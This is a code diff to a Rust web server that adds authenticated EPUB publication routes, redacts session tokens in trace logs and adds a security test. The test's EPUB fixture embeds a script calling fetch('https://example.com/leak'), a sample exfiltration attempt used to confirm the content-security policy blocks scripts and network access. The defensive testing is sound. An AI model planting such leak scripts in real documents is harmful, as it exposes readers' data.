@@ -23,6 +23,7 @@ mod offline;
 mod pgs_overlay;
 mod photos;
 mod plex;
+pub(crate) mod publication;
 mod reading;
 mod scan;
 pub(crate) mod stream;
@@ -187,6 +188,12 @@ pub fn router(state: AppState) -> Router {
         .route("/offline/media/{token}/{segment}", get(offline::segment))
         .route("/files/{id}/direct", get(stream::direct))
         .route("/files/{id}/content", get(stream::book_content))
+        .route("/files/{id}/publication", post(publication::open))
+        .route("/publication/{session}", delete(publication::close))
+        .route(
+            "/publication/{session}/{*resource}",
+            get(publication::resource),
+        )
         .route("/files/{id}/stream.mp4", get(stream::stream_mp4))
         .route(
             "/files/{id}/subs/{index}/overlay.json",
@@ -289,11 +296,12 @@ pub fn router(state: AppState) -> Router {
 
 fn safe_trace_target(uri: &Uri) -> String {
     let mut segments = uri.path().split('/').collect::<Vec<_>>();
-    for marker in ["media", "hls"] {
+    for marker in ["media", "hls", "publication"] {
         if let Some(index) = segments.iter().position(|segment| *segment == marker) {
             let is_capability_route = match marker {
                 "media" => index >= 2 && segments.get(index.wrapping_sub(1)) == Some(&"offline"),
                 "hls" => true,
+                "publication" => true,
                 _ => false,
             };
             if is_capability_route && index + 1 < segments.len() {
@@ -340,6 +348,7 @@ async fn readyz(State(state): State<AppState>) -> impl IntoResponse {
 
 #[cfg(test)]
 mod tests {
+    use std::io::Write;
     use std::sync::Arc;
 
     use axum::body::Body;
@@ -348,6 +357,8 @@ mod tests {
     use plurx_core::store::SqliteStore;
     use serde_json::{json, Value};
     use tower::ServiceExt;
+    use zip::write::SimpleFileOptions;
+    use zip::{CompressionMethod, ZipWriter};
 
     use super::*;
 
@@ -372,6 +383,14 @@ mod tests {
         assert_eq!(
             safe_trace_target(&hls),
             "/api/v1/hls/[REDACTED]/seg00001.ts"
+        );
+
+        let publication: Uri = "/api/v1/publication/session-secret/OEBPS/chapter.xhtml"
+            .parse()
+            .expect("uri");
+        assert_eq!(
+            safe_trace_target(&publication),
+            "/api/v1/publication/[REDACTED]/OEBPS/chapter.xhtml"
         );
     }
 
@@ -3354,6 +3373,212 @@ mod tests {
         )
         .await;
         assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
+    }
+
+    fn write_epub_fixture(path: &std::path::Path) {
+        let file = std::fs::File::create(path).expect("EPUB fixture file");
+        let mut writer = ZipWriter::new(file);
+        let options = SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
+        for (name, body) in [
+            ("mimetype", "application/epub+zip"),
+            (
+                "META-INF/container.xml",
+                r#"<container><rootfiles><rootfile full-path="OEBPS/book.opf"/></rootfiles></container>"#,
+            ),
+            (
+                "OEBPS/book.opf",
+                r#"<package><metadata><title>HTTP Proof</title></metadata><manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="chapter" href="Text/chapter.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="chapter"/></spine></package>"#,
+            ),
+            (
+                "OEBPS/nav.xhtml",
+                r#"<html xmlns:epub="http://www.idpf.org/2007/ops"><body><nav epub:type="toc"><ol><li><a href="Text/chapter.xhtml">Chapter</a></li></ol></nav></body></html>"#,
+            ),
+            (
+                "OEBPS/Text/chapter.xhtml",
+                r#"<html><body><script>fetch('https://example.com/leak')</script><h1>Chapter</h1></body></html>"#,
+            ),
+        ] {
+            writer
+                .start_file(name, options)
+                .expect("EPUB fixture entry");
+            writer
+                .write_all(body.as_bytes())
+                .expect("EPUB fixture bytes");
+        }
+        writer.finish().expect("finish EPUB fixture");
+    }
+
+    #[tokio::test]
+    async fn publication_api_is_authenticated_scoped_and_script_network_closed() {
+        use plurx_core::domain::{ItemKind, LibraryKind, NewItem, NewLibrary, ProbeResult};
+
+        let directory = tempfile::tempdir().expect("publication directory");
+        let path = directory.path().join("proof.epub");
+        write_epub_fixture(&path);
+        let metadata = std::fs::metadata(&path).expect("EPUB metadata");
+        let size = i64::try_from(metadata.len()).expect("fixture size");
+        let mtime = metadata
+            .modified()
+            .expect("fixture mtime")
+            .duration_since(std::time::UNIX_EPOCH)
+            .expect("fixture after epoch")
+            .as_secs() as i64;
+
+        let (app, state) = test_state();
+        let admin = setup_admin(&app).await;
+        let library = state
+            .store
+            .create_library(&NewLibrary {
+                name: "Publication API Books".into(),
+                kind: LibraryKind::Books,
+                paths: vec![directory.path().to_path_buf()],
+                anime: false,
+            })
+            .await
+            .expect("books library");
+        let item = state
+            .store
+            .insert_item(&NewItem {
+                library_id: library.id,
+                kind: ItemKind::Book,
+                parent_id: None,
+                title: "HTTP Proof".into(),
+                year: None,
+                season_number: None,
+                episode_number: None,
+            })
+            .await
+            .expect("book");
+        let file = state
+            .store
+            .upsert_file(
+                item,
+                &path.to_string_lossy(),
+                size,
+                mtime,
+                &ProbeResult::default(),
+            )
+            .await
+            .expect("book file");
+        let open_uri = format!("/api/v1/files/{file}/publication");
+        assert_eq!(
+            call(&app, post(&open_uri, None, json!({}))).await.0,
+            StatusCode::UNAUTHORIZED
+        );
+        let (status, opened) = call(&app, post(&open_uri, Some(&admin), json!({}))).await;
+        assert_eq!(status, StatusCode::OK, "{opened}");
+        assert_eq!(opened["publication"]["metadata"]["title"], "HTTP Proof");
+        assert_eq!(opened["publication"]["toc"][0]["title"], "Chapter");
+        assert_eq!(opened["limits"]["entries"], 20_000);
+        assert_eq!(opened["limits"]["concurrent_resource_reads"], 8);
+        assert_eq!(opened["limits"]["resource_chunk_bytes"], 65_536);
+
+        let resource_uri = format!(
+            "{}OEBPS/Text/chapter.xhtml",
+            opened["resource_base"].as_str().expect("resource base")
+        );
+        let response = app
+            .clone()
+            .oneshot(get(&resource_uri, None))
+            .await
+            .expect("publication resource");
+        assert_eq!(response.status(), StatusCode::OK);
+        let csp = response
+            .headers()
+            .get("content-security-policy")
+            .and_then(|value| value.to_str().ok())
+            .expect("resource CSP");
+        assert!(csp.contains("script-src 'none'"), "{csp}");
+        assert!(csp.contains("connect-src 'none'"), "{csp}");
+        assert!(csp.contains("img-src 'self' data:"), "{csp}");
+        assert!(response.headers().get("content-length").is_some());
+        assert!(response.headers().get("referrer-policy").is_some());
+        let resource_body = response
+            .into_body()
+            .collect()
+            .await
+            .expect("streamed publication body")
+            .to_bytes();
+        assert!(
+            resource_body
+                .windows(b"<h1>Chapter</h1>".len())
+                .any(|window| window == b"<h1>Chapter</h1>"),
+            "the decompressed resource must reach the HTTP body"
+        );
+
+        call(
+            &app,
+            post(
+                "/api/v1/users",
+                Some(&admin),
+                json!({ "username": "reader", "password": "longenough" }),
+            ),
+        )
+        .await;
+        let (_, login) = call(
+            &app,
+            post(
+                "/api/v1/auth/login",
+                None,
+                json!({ "username": "reader", "password": "longenough" }),
+            ),
+        )
+        .await;
+        let reader = login["token"].as_str().expect("reader token").to_owned();
+        let session = opened["session_id"].as_str().expect("session id");
+        assert_eq!(
+            call(
+                &app,
+                delete_req(&format!("/api/v1/publication/{session}"), Some(&reader),),
+            )
+            .await
+            .0,
+            StatusCode::NOT_FOUND,
+            "a different user must not discover or revoke the capability"
+        );
+        assert_eq!(
+            app.clone()
+                .oneshot(get(&resource_uri, None))
+                .await
+                .expect("publication resource after foreign close")
+                .status(),
+            StatusCode::OK
+        );
+
+        // A capability is bound to the exact bytes that were parsed. Even a
+        // still-valid session must not blend a new ZIP revision with the old
+        // manifest.
+        std::fs::OpenOptions::new()
+            .append(true)
+            .open(&path)
+            .expect("reopen EPUB")
+            .write_all(b"changed")
+            .expect("replace EPUB revision");
+        assert_eq!(
+            app.clone()
+                .oneshot(get(&resource_uri, None))
+                .await
+                .expect("changed resource")
+                .status(),
+            StatusCode::CONFLICT
+        );
+
+        assert_eq!(
+            call(
+                &app,
+                delete_req(&format!("/api/v1/publication/{session}"), Some(&admin)),
+            )
+            .await
+            .0,
+            StatusCode::NO_CONTENT
+        );
+        assert_eq!(
+            app.oneshot(get(&resource_uri, None))
+                .await
+                .expect("closed resource")
+                .status(),
+            StatusCode::NOT_FOUND
+        );
     }
 
     #[tokio::test]
